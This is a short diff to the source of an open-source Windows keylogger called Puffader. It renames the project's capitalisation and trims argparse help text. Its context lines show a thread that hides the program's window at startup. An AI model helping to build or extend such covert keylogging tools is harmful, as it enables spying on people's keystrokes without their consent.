@@ -1,5 +1,5 @@
 '''
-PuffAder Windows Keylogger by xp4xbox
+Puffader Windows Keylogger by xp4xbox
 https://github.com/xp4xbox/Puffader
 
 Copyright (c) 2017 xp4xbox
@@ -52,9 +52,8 @@ def hide():
 # hide window as new thread. Necessary in order to define timer used later
 objTimer = threading.Timer(0, hide);objTimer.start()
 
-
-objParser = argparse.ArgumentParser(description="")  # set up arg parser
-objParser.add_argument("-o", "--open", default=None, help="path to text file to open in notepad")  # add args
+objParser = argparse.ArgumentParser()  # set up arg parser
+objParser.add_argument("-o", "--open", default=None)  # add args
 args = objParser.parse_args()
 
 # open file in notepad if argument is given
